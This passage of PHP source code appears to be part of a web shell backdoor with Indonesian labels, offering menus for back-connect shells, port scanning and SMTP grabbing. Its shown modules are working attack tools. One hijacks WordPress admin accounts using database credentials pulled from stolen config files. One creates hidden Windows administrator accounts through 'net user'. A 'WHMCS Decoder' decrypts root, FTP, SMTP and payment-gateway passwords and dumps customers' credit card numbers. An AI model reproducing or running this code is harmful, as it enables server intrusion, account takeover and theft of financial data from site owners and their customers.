			$user = $own['name'];
			$all[$user][] = $dom;
			//echo "$user: $dom<br/>";
		  }
		}
		echo "";
	  }
	  elseif($d0mains){

		$mck = array();
		foreach($d0mains as $domain){
		  preg_match_all('#zone "(.*)"#',$domain,$dom);
		  flush();
		  if(strlen(trim($domain[1][0])) >2){
			$mck[] = $dom[1][0];
		  }
		}
		
		$mck = array_unique($mck);
		foreach($mck as $dom){
		  $own = posix_getpwuid(fileowner("/etc/valiases/$dom"));
		  $user = $own['name'];
		  $all[$user][] = $dom;
		  //echo "$user: $dom<br/>";
		}
		echo "";
	  }
	}
foreach($all as $user => $domain){
  echo "<center>User <font color='red'>$user</font> has <font color='red'>".count($domain)."</font> Domains below :<br></center>";
  echo "<center>---------------<br>";
  foreach($domain as $v){
    echo "<center><a href='http://$v/' target='_blank'>http://$v<a><br></center>";
	}
  echo "<center>---------------";
  echo "<br><br>";
		}

}
elseif($_GET['do'] == 'wpes') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";

	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "bahari";
		$pass = "bahari";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "Error, Cant edit the user :(</font><br>";
			} else {
				echo "<font color='lime'>Done</font> >> <a href='$target/wp-login.php' target='_blank'> $target <a><br>
					  <font color='lime'>User</font>  : bahari<br>
					  <font color='lime'>Password</font>  : bahari<br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Edit User</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/btm_conf/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar'>
		</form></center>";
		}
}
elseif($_GET['do'] == 'rdp') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "<center>[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".$ip."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			</center>";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user indoxploit");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>indoxploit</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "<center>-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='denita' required>
			<input type='text' name='pass' placeholder='password' value='denita' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form></center>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}

}
elseif($_GET['do'] == 'tetangga') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";

		 echo "<center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Reverse Domain ip Lookup</span></center>
		";
		echo "<div id=result>";
		echo "<center><br><form><input type='text' size='60' placeholder='watch8x.com' name='setan' /><input type='hidden' name='do' value='tetangga'> &nbsp;<input type='submit' value='&nbsp;&check;&nbsp;'></form></center>";
		if(isset($_GET["setan"]))
		{
		$site = $_GET["setan"];
		$setan = "http://domains.yougetsignal.com/domains.php";

		//Curl Function
		$ch = curl_init($setan);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$site&ket=");
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		echo "<table style='margin: 0 auto'>";
		foreach($array as $lnk)
		{
			print "<tr><td><a  style=\"color:#0f0;font-weight:bold;\" href='$lnk' target=_blank>$lnk</a></td></tr>";
		}
		echo "</table>";
		curl_close($ch);
		}
}
elseif($_GET['do'] == 'whmcs') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";

	echo"<p><br/><body>
	<center><br/><br/><nobr><b><span>WHMCS DECODER</span></b></nobr><br/><br/>
	<p><form method='post'>
	<table border=1>
	<tr><td>db_host </td><td><input type='text' style='color:#FF0000;background-color:transparent' size='60' name='anu1' value='localhost'></td></tr>
	<tr><td>db_username </td><td><input type='text' style='color:#FF0000;background-color:transparent' size='60' name='anu2'></td></tr>
	<tr><td>db_password</td><td><input type='text' style='color:#FF0000;background-color:transparent' size='60' name='anu3'></td></tr>
	<tr><td>db_name</td><td><input type='text' style='color:#FF0000;background-color:transparent' size='60' name='anu4'></td></tr>
	<tr><td>cc_encryption_hash</td><td><input style='color:#FF0000;background-color:transparent' type='text' size='60' name='anu5'></td></tr>
	<tr><td align='center' colspan='2'><input class=submit type='submit' style='color:#FF0000;background-color:transparent' value=' HAJAR ' name='plapon'></td></tr>
	 
	</table>
	<br></form></center>";


		$perawan = $_POST['anu1'];
		$kimcil = $_POST['anu2'];
		$janda = $_POST['anu3'];
		$hotel = $_POST['anu4'];
		$kondom = $_POST['anu5'];
		@mysql_connect($perawan, $kimcil, $janda);
		@mysql_select_db($hotel);
		$cc_encryption_hash = $kondom;
		function dec($string, $cc_encryption_hash) {
			$key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
			$hash_key = _hash($key);
			$hash_length = strlen($hash_key);
			$string = base64_decode($string);
			$tmp_iv = substr($string, 0, $hash_length);
			$string = substr($string, $hash_length, strlen($string) - $hash_length);
			$iv = $out = '';
			$c = 0;
			while ($c < $hash_length) {
				$iv.= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
				++$c;
			}
			$key = $iv;
			$c = 0;
			while ($c < strlen($string)) {
				if (($c != 0 AND $c % $hash_length == 0)) {
					$key = _hash($key . substr($out, $c - $hash_length, $hash_length));
				}
				$out.= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
				++$c;
			}
			return $out;
		}
		function _hash($string) {
			$hash = (function_exists('sha1')) ? sha1($string) : md5($string);
			$out = '';
			$c = 0;
			while ($c < strlen($hash)) {
				$out.= chr(hexdec($hash[$c] . $hash[$c + 1]));
				$c+= 2;
			}
			return $out;
		}
		########  GO TO HELL ########
		##### :D ########### :D #####
		if (isset($_POST['plapon'])) {
			$query = mysql_query("SELECT *FROM tblservers");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='7'> <span> HOST ROOT </span> </th></tr> 
	<tr> 
	<th class='th_home' align='center'><b>TYPE</b></th>
	<th class='th_home' align='center'><b>ACTIVE</b></th>
	<th class='th_home' align='center'><b>HOSTNAME</b></th>
	<th class='th_home' align='center'><b>IP ADDRESS</b></th>
	<th class='th_home' align='center'><b>USERNAME</b></th>
	<th class='th_home' align='center'><b>PASSWORD</b></th>
	<th class='th_home' align='center'><b>ACCESS HASH</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='8' align='center'>Nothing Found !</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				echo "<tr>
	<td class='td_home' align='center'>{$v['type']}</td>
	<td class='td_home' align='center'>{$v['active']}</td> 
	<td class='td_home' align='center'>{$v['hostname']}</td>
	<td class='td_home' align='center'>{$v['ipaddress']}</td>
	<td class='td_home' align='center'>{$v['username']}</td>
	<td class='td_home' align='center'>" . dec($v['password'], $cc_encryption_hash) . "</td>
	<td class='td_home' align='center'>{$v['accesshash']}</td> 
	</tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT * FROM tblhosting where username = 'root' or username = 'vmuserxx' or username = 'vmuser' or username = 'admin' or username = 'Admin' or username = 'administrator' or username = 'Administrator' order by domainstatus");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='6'><span>CLIENTS ROOT</span> </th></tr> 
	 
	<tr>
	<th class='th_home' align='center'><b> DOMAIN</b></th>
	<th class='th_home' align='center'><b> STATUS</b></th>
	<th class='th_home' align='center'><b> USERNAME</b></th>
	<th class='th_home' align='center'><b> PASSWORD</b></th>
	<th class='th_home' align='center'><b> DEDICATED IP</b></th>
	<th class='th_home' align='center'><b> ASSIGNED IP</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='6' align='center'>Nothing Found ! :(</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				echo "<tr>
	<td class='td_home' align='center'> {$v['domain']}</td>
	<td class='td_home' align='center'> {$v['domainstatus']}</td>
	<td class='td_home' align='center'> {$v['username']}</td>
	<td class='td_home' align='center'> " . dec($v['password'], $cc_encryption_hash) . "</td>
	<td class='td_home' align='center'> {$v['dedicatedip']}</td>
	<td class='td_home' align='center'> {$v['assignedips']}</td></tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT *FROM tblregistrars");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='3'><nobr><span> DOMAIN REGISTRAR </span></nobr></th></tr> 
	<tr>
	<th class='th_home' align='center'><b>REGISTRAR</b></th>
	<th class='th_home' align='center'><b>SETTING</b></th>
	<th class='th_home' align='center'><b>VALUE</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='3' align='center'>Nothing Found !</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				$value = (!dec($v['value'], $cc_encryption_hash)) ? "0" : dec($v['value'], $cc_encryption_hash);
				echo "<tr>
	<td class='td_home' align='center'>{$v['registrar']}</td>
	<td class='td_home' align='center'>{$v['setting']}</td>
	<td class='td_home' align='center'>$value</td></tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT * FROM tblconfiguration where 1");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='4'> <span> FTP BACKUP </span> </th></tr> 
	 
	<tr> 
	<th class='th_home' align='center'><b>FTP HOSTNAME</b></th>
	<th class='th_home' align='center'><b>FTP USERNAME</b></th>
	<th class='th_home' align='center'><b>FTP PASSWORD</b></th>
	<th class='th_home' align='center'><b>DESTINATION</b></th></tr>";
			$ftpb = array('FTPBackupHostname', 'FTPBackupUsername', 'FTPBackupPassword', 'FTPBackupDestination');
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='4' align='center'>Nothing Found ! :(</td></tr>";
			}
			while ($row = mysql_fetch_array($query)) {
				if ($row[setting] == $ftpb[0]) {
					echo "<tr><td class='td_home'>{$row[value]}</td>";
					$ftpb[0] = xxx;
				} elseif ($row[setting] == $ftpb[1]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$ftpb[1] = xxx;
				} elseif ($row[setting] == $ftpb[2]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$ftpb[2] = xxx;
				} elseif ($row[setting] == $ftpb[3]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$ftpb[3] = xxx;
				}
			}
			echo "</table>";
			$query = mysql_query("SELECT * FROM tblconfiguration where 1");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='4'><span> SMTP SERVER </span> </th></tr>
	<tr> 
	<th class='th_home' align='center'><b>SMTP HOST</b></th>
	<th class='th_home' align='center'><b>SMTP USER</b></th>
	<th class='th_home' align='center'><b>SMTP PASS</b></th>
	<th class='th_home' align='center'><b>SMTP PORT</b></th></tr>";
			$smtp = array('SMTPHost', 'SMTPUsername', 'SMTPPassword', 'SMTPPort');
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='4' align='center'>Nothing Found ! :(</td></tr>";
			}
			while ($row = mysql_fetch_array($query)) {
				if ($row[setting] == $smtp[0]) {
					echo "<tr><td class='td_home'>{$row[value]}</td>";
					$smtp[0] = xxx;
				} elseif ($row[setting] == $smtp[1]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$smtp[1] = xxx;
				} elseif ($row[setting] == $smtp[2]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$smtp[2] = xxx;
				} elseif ($row[setting] == $smtp[3]) {
					echo "<td class='td_home'>{$row[value]}</td>";
					$smtp[3] = xxx;
				}
			}
			echo "</table>";
			$query = mysql_query("SELECT *FROM tblpaymentgateways");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='4'><nobr><span> PAYMENTS GATEWAY </span></nobr></th></tr> 
	 
	<tr>
	<th class='th_home' align='center'><b>GATEWAY</b></th>
	<th class='th_home' align='center'><b>SETTING</b></th>
	<th class='th_home' align='center'><b>VALUE</b></th>
	<th class='th_home' align='center'><b>ORDER</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='4' align='center'>Nothing Found !</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				echo "<tr>
	<td class='td_home' align='center'>{$v['gateway']}</td>
	<td class='td_home' align='center'>{$v['setting']}</td>
	<td class='td_home' align='center'>{$v['value']}</td>
	<td class='td_home' align='center'>{$v['order']}</td> </tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT id FROM tblclients WHERE issuenumber != '' ORDER BY id DESC");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='10'><nobr><span> CLIENTS CREDIT CARD </span></nobr></th></tr> 
	<tr>
	<th class='th_home' align='center'><b>CardType</b></th>
	<th class='th_home' align='center'><b>CardNumb</b></th>
	<th class='th_home' align='center'><b>Expdate</b></th>
	<th class='th_home' align='center'><b>IssueNumber</b></th>
	<th class='th_home' align='center'><b>FirstName</b></th>
	<th class='th_home' align='center'><b>LastName</b></th>
	<th class='th_home' align='center'><b>Address</b></th>
	<th class='th_home' align='center'><b>Country</b></th> 
	<th class='th_home' align='center'><b>Phone</b></th>
	<th class='th_home' align='center'><b>Email</b></th> 
	</tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='10' align='center'>Nothing Found ! :(</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				$cchash = md5($cc_encryption_hash . $v['0']);
				$s = mysql_query("SELECT firstname,lastname,address1,country,phonenumber,cardtype,email,AES_DECRYPT(cardnum,'" . $cchash . "') as cardnum,AES_DECRYPT(expdate,'" . $cchash . "') as expdate,AES_DECRYPT(issuenumber,'" . $cchash . "') as issuenumber FROM tblclients WHERE id='" . $v['0'] . "'");
				$v2 = mysql_fetch_array($s);
				echo "<tr>
	<td class='td_home' align='center'>" . $v2['cardtype'] . "</td>
	<td class='td_home' align='center'>" . $v2['cardnum'] . "</td>
	<td class='td_home' align='center'>" . $v2['expdate'] . "</td>
	<td class='td_home' align='center'>" . $v2['issuenumber'] . "</td>
	<td class='td_home' align='center'>" . $v2['firstname'] . "</td>
	<td class='td_home' align='center'>" . $v2['lastname'] . "</td>
	<td class='td_home' align='center'>" . $v2['address1'] . "</td>
	<td class='td_home' align='center'>" . $v2['country'] . "</td> 
	<td class='td_home' align='center'>" . $v2['phonenumber'] . "</td>
	<td class='td_home' align='center'>" . $v2['email'] . "</td></tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT *FROM tblhosting");
			echo "<br/><br/><center>
	<table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='6'><nobr><span> CLIENTS HOSTING ACCOUNT </span></nobr></th></tr> 
	<tr>
	<th class='th_home' align='center'><b>DOMAIN</b></th>
	<th class='th_home' align='center'><b>STATUS</b></th>
	<th class='th_home' align='center'><b>USERNAME</b></th>
	<th class='th_home' align='center'><b>PASSWORD</b></th>
	<th class='th_home' align='center'><b>DEDICATED IP</b></th>
	<th class='th_home' align='center'><b>ASSIGNED IP</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='6' align='center'>Nothing Found !</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				echo "<tr>
	<td class='td_home' align='center'>{$v['domain']}</td>
	<td class='td_home' align='center'>{$v['domainstatus']}</td>
	<td class='td_home' align='center'>{$v['username']}</td>
	<td class='td_home' align='center'>" . dec($v['password'], $cc_encryption_hash) . "</td>
	<td class='td_home' align='center'>{$v['dedicatedip']}</td>
	<td class='td_home' align='center'>{$v['assignedips']}</td></tr>";
			}
			echo "</table>";
		}
}
elseif($_GET['do'] == 'hash') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";
    if (isset($_POST['gethash'])) {
        $hash = $_POST['hash'];
        if (strlen($hash) == 32) {
            $hashresult = "MD5 Hash";
        } elseif (strlen($hash) == 40) {
            $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
        } elseif (strlen($hash) == 13) {
            $hashresult = "DES(Unix) Hash";
        } elseif (strlen($hash) == 16) {
            $hashresult = "MySQL Hash / /DES(Oracle Hash)";
        } elseif (strlen($hash) == 41) {
            $GetHashChar = substr($hash, 40);
            if ($GetHashChar == "*") {
                $hashresult = "MySQL5 Hash";
            }
        } elseif (strlen($hash) == 64) {
            $hashresult = "SHA-256 Hash";
        } elseif (strlen($hash) == 96) {
            $hashresult = "SHA-384 Hash";
        } elseif (strlen($hash) == 128) {
            $hashresult = "SHA-512 Hash";
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$1$')) {
                $hashresult = "MD5(Unix) Hash";
            }
        } elseif (strlen($hash) == 37) {
            if (strstr($hash, '$apr1$')) {
                $hashresult = "MD5(APR) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$H$')) {
                $hashresult = "MD5(phpBB3) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$P$')) {
                $hashresult = "MD5(Wordpress) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$5$')) {
                $hashresult = "SHA-256(Unix) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$6$')) {
                $hashresult = "SHA-512(Unix) Hash";
            }
        } elseif (strlen($hash) == 24) {
            if (strstr($hash, '==')) {
                $hashresult = "MD5(Base-64) Hash";
            }
        } else {
            $hashresult = "Hash type not found";
        }
    } else {
        $hashresult = "<center>Not Hash Entered</center>";
    }

	echo"<center>
	
		<form action='' method='POST'>
		<tr>
		<th colspan='5'>Hash Identification</th><br><br>
		<tr class='optionstr'><B><td>Enter Hash :</td><br></b><td></td>	<td><input type='text' name='hash' size='60' class='inputz' /></td><td><input type='submit' class='inputzbut' name='gethash' value='Identify Hash' /></td></tr><br>
